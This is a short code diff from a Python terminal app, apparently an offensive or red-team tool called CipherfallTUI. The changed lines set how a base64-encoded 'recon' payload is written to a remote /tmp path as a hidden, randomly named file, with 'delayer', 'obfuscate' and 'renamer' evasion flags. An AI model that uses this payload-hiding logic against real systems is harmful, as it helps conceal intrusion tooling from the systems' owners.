@@ -878,7 +878,7 @@ class CipherfallTUI(App):
                         tmp = tmpdir / new_name
                 data  = tmp.read_bytes()
                 b64   = base64.b64encode(data).decode()
-                rname = f"/tmp/.{uuid.uuid4().hex[:8]}"
+                rname = f"/tmp/{tmp.name}" if do_renamer else f"/tmp/.{uuid.uuid4().hex[:8]}"
                 cmd   = f"WRITE:{rname}:{b64}"
                 flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
                 log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
